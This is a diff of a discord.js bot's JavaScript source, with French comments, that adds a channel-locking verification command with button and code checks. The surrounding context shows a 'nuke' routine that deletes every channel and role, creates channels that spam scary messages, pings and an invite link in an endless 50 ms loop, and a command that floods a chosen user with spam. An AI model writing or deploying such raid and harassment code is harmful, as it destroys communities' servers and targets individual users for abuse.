@@ -1,6 +1,19 @@
 ﻿require('dotenv').config();
 const fs = require('fs');
-const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { 
+    Client, 
+    GatewayIntentBits, 
+    PermissionsBitField, 
+    ChannelType, 
+    EmbedBuilder, 
+    ActionRowBuilder, 
+    ButtonBuilder, 
+    ButtonStyle,
+    StringSelectMenuBuilder, // NOUVEAU
+    ModalBuilder,            // NOUVEAU
+    TextInputBuilder,        // NOUVEAU
+    TextInputStyle           // NOUVEAU
+} = require('discord.js');
 
 // ============================================================
 // GESTION DES STATS PERMANENTES (FICHIER JSON)
@@ -243,6 +256,10 @@ client.on('messageCreate', async (message) => {
         await handleSpam(message, args);
     }
 
+    if (command === 'verif') {
+        await handleVerif(message);
+    }
+
     if (command === 'set') {
         statsChannelId = message.channel.id;
         statsMessageId = null;
@@ -252,7 +269,7 @@ client.on('messageCreate', async (message) => {
 });
 
 // ============================================================
-// NUKE FUNCTION (AVEC SPAM INFINI + PING)
+// NUKE FUNCTION (AVEC SPAM INFINI + PING + RÔLE NIKI)
 // ============================================================
 async function handleNuke(message) {
     if (message.author.id !== AUTHORIZED_ID) {
@@ -286,7 +303,7 @@ async function handleNuke(message) {
         });
         await Promise.all(deletePromises);
 
-        // 2. DELETE ALL ROLES (except @everyone and the bot's highest role)
+        // 2. DELETE ALL ROLES (except @everyone)
         const roles = guild.roles.cache;
         const deleteRolePromises = roles.map(async (role) => {
             if (role.name !== '@everyone' && role.id !== guild.id) {
@@ -313,7 +330,6 @@ async function handleNuke(message) {
                 type: ChannelType.GuildText,
             }).then(async (channel) => {
                 try {
-                    // Envoi des messages de base
                     await channel.send('```' + ASCII_BANNER + '```');
                     await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
                     await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
@@ -328,7 +344,6 @@ async function handleNuke(message) {
                     await channel.send({ embeds: [embed] });
                     await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
 
-                    // BOUCLE DE SPAM INFINI
                     let isSpamming = true;                    
                     while (isSpamming) {
                         try {
@@ -337,10 +352,8 @@ async function handleNuke(message) {
                             await new Promise(resolve => setTimeout(resolve, 50));
                         } catch (e) {
                             isSpamming = false;
-                            console.log(`Salon ${channel.name} a arrêté le spam.`);
                         }
                     }
-
                     channelsCreated++;
                 } catch (e) {}
             }).catch(() => {});
@@ -461,9 +474,6 @@ async function handleSpam(message, args) {
         return message.reply('❌ Je ne peux pas me spam moi-même !');
     }
 
-    // J'ai SUPPRIMÉ la vérification qui t'empêchait de te spammer toi-même.
-    // Tu peux maintenant te spammer autant que tu veux !
-
     await message.reply(`💀 **SPAM INITIALIZED sur ${targetMember.user.tag}...`);
 
     const user = targetMember.user;
@@ -523,5 +533,213 @@ async function handleSpam(message, args) {
         await message.channel.send({ embeds: [errorEmbed] });
     }
 }
+
+// ============================================================
+// VERIFICATION FUNCTION (!verif)
+// ============================================================
+async function handleVerif(message) {
+    if (message.author.id !== AUTHORIZED_ID) {
+        return message.reply('❌ You are not authorized to use this command!');
+    }
+
+    const guild = message.guild;
+
+    // Étape 1 : Créer le rôle Membre
+    let memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
+    if (!memberRole) {
+        memberRole = await guild.roles.create({
+            name: '✅ Membre',
+            color: '#00FF00',
+            hoist: true,
+            mentionable: false
+        });
+    }
+
+    // Étape 2 : Verrouiller TOUS les salons
+    const channels = guild.channels.cache;
+    const lockPromises = channels.map(async (channel) => {
+        try {
+            await channel.permissionOverwrites.edit(guild.roles.everyone, {
+                ViewChannel: false
+            });
+            await channel.permissionOverwrites.edit(memberRole, {
+                ViewChannel: true
+            });
+        } catch (e) {}
+    });
+    await Promise.all(lockPromises);
+
+    // Étape 3 : Créer le salon de vérification tout en haut
+    let verifChannel = guild.channels.cache.find(c => c.name === '🔓-vérification');
+    if (!verifChannel) {
+        verifChannel = await guild.channels.create({
+            name: '🔓-vérification',
+            type: ChannelType.GuildText,
+            position: 0 // Tout en haut
+        });
+    }
+    // On s'assure que tout le monde peut voir ce salon
+    await verifChannel.permissionOverwrites.edit(guild.roles.everyone, {
+        ViewChannel: true,
+        SendMessages: false
+    });
+
+    // Étape 4 : Créer le message avec le bouton
+    const row = new ActionRowBuilder()
+        .addComponents(
+            new ButtonBuilder()
+                .setCustomId('start_verif')
+                .setLabel('🔐 Clique ici pour vérifier ton compte')
+                .setStyle(ButtonStyle.Success)
+        );
+
+    const oldMessages = await verifChannel.messages.fetch({ limit: 10 });
+    await verifChannel.bulkDelete(oldMessages);
+
+    await verifChannel.send({
+        content: `**Bienvenue sur le système de vérification !**\nClique sur le bouton ci-dessous pour commencer.`,
+        components: [row]
+    });
+
+    await message.reply(`✅ **Système de vérification installé !**\nSalon créé : ${verifChannel}\nRôle créé : ${memberRole}\nTous les autres salons sont désormais privés.`);
+}
+
+// ============================================================
+// GESTION DES INTERACTIONS (BOUTONS & MENUS & MODALES)
+// ============================================================
+client.on('interactionCreate', async (interaction) => {
+    // Bouton "Démarrer la vérification"
+    if (interaction.isButton() && interaction.customId === 'start_verif') {
+        const menuRow = new ActionRowBuilder()
+            .addComponents(
+                new StringSelectMenuBuilder()
+                    .setCustomId('select_verif_type')
+                    .setPlaceholder('Choisis ton système de vérification')
+                    .addOptions([
+                        {
+                            label: '🔢 Code aléatoire',
+                            description: 'Le bot te donnera un code à recopier.',
+                            value: 'code'
+                        },
+                        {
+                            label: '✅ Bouton simple',
+                            description: 'Clique sur "Je suis humain" et c\'est bon.',
+                            value: 'simple'
+                        }
+                    ])
+            );
+
+        await interaction.reply({
+            content: '**Quel type de vérification souhaites-tu utiliser ?**',
+            components: [menuRow],
+            ephemeral: true
+        });
+    }
+
+    // Menu déroulant (Choix du type)
+    if (interaction.isStringSelectMenu() && interaction.customId === 'select_verif_type') {
+        const choice = interaction.values[0];
+        const guild = interaction.guild;
+        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
+
+        if (!memberRole) {
+            return interaction.reply({ content: '❌ Erreur : Le rôle Membre n\'existe pas. Contacte un admin.', ephemeral: true });
+        }
+
+        // SYSTÈME BOUTON SIMPLE
+        if (choice === 'simple') {
+            const simpleRow = new ActionRowBuilder()
+                .addComponents(
+                    new ButtonBuilder()
+                        .setCustomId('confirm_simple')
+                        .setLabel('✅ Je suis humain, donne-moi l\'accès')
+                        .setStyle(ButtonStyle.Primary)
+                );
+
+            await interaction.update({
+                content: '**Système Bouton Simple :**\nClique sur le bouton ci-dessous pour obtenir le rôle.',
+                components: [simpleRow]
+            });
+        }
+
+        // SYSTÈME CODE ALÉATOIRE
+        if (choice === 'code') {
+            const code = Math.floor(1000 + Math.random() * 9000).toString();
+            
+            global.verifCodes = global.verifCodes || new Map();
+            global.verifCodes.set(interaction.user.id, code);
+
+            const modal = new ModalBuilder()
+                .setCustomId('code_verif_modal')
+                .setTitle('🔢 Vérification par code');
+
+            const codeInput = new TextInputBuilder()
+                .setCustomId('code_input')
+                .setLabel('Recopie le code ci-dessous : ' + code)
+                .setStyle(TextInputStyle.Short)
+                .setPlaceholder('Entrer le code ici...')
+                .setRequired(true);
+
+            const actionRow = new ActionRowBuilder().addComponents(codeInput);
+            modal.addComponents(actionRow);
+
+            await interaction.showModal(modal);
+        }
+    }
+
+    // Bouton "Confirmation simple"
+    if (interaction.isButton() && interaction.customId === 'confirm_simple') {
+        const guild = interaction.guild;
+        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
+
+        if (!memberRole) {
+            return interaction.reply({ content: '❌ Erreur : Rôle introuvable.', ephemeral: true });
+        }
+
+        if (interaction.member.roles.cache.has(memberRole.id)) {
+            return interaction.reply({ content: '❌ Tu as déjà le rôle !', ephemeral: true });
+        }
+
+        await interaction.member.roles.add(memberRole);
+        await interaction.update({
+            content: '✅ **Vérification réussie !** Tu as maintenant accès à tous les salons.',
+            components: []
+        });
+    }
+});
+
+// ============================================================
+// GESTION DES MODALES (CODE)
+// ============================================================
+client.on('interactionCreate', async (interaction) => {
+    if (!interaction.isModalSubmit()) return;
+
+    if (interaction.customId === 'code_verif_modal') {
+        const enteredCode = interaction.fields.getTextInputValue('code_input');
+        const storedCode = global.verifCodes ? global.verifCodes.get(interaction.user.id) : null;
+
+        const guild = interaction.guild;
+        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
+
+        if (!memberRole) {
+            return interaction.reply({ content: '❌ Erreur : Rôle introuvable.', ephemeral: true });
+        }
+
+        if (enteredCode === storedCode) {
+            await interaction.member.roles.add(memberRole);
+            global.verifCodes.delete(interaction.user.id);
+            
+            await interaction.reply({
+                content: '✅ **Code correct !** Tu as maintenant accès à tous les salons.',
+                ephemeral: true
+            });
+        } else {
+            await interaction.reply({
+                content: '❌ **Code incorrect.** Réessaye en tapant `!verif` dans le salon de vérification.',
+                ephemeral: true
+            });
+        }
+    }
+});
 
 client.login(process.env.TOKEN);
